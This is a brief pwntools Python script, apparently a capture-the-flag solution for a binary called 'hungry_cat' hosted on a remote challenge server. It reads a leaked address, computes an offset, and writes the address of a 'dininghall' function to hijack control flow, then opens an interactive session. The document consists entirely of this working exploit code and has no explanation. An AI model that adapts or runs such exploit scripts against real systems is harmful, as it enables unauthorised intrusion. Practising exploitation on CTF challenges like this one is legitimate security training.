from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

elf = ELF("./hungry_cat")

io = remote("node10.anna.nssnode.cn", 28087)

io.recvuntil(b"\n")
io.recvuntil(b"\n")
io.send(b"\xff" * 8)

io.recvuntil(b"gift: 0x")
offset = int(io.recv(12), 16)

padding = 0x18
io.sendafter(b"??\n", flat(offset + padding + 0x8))

io.sendafter(b"???\n", flat(elf.symbols["dininghall"]))

io.interactive()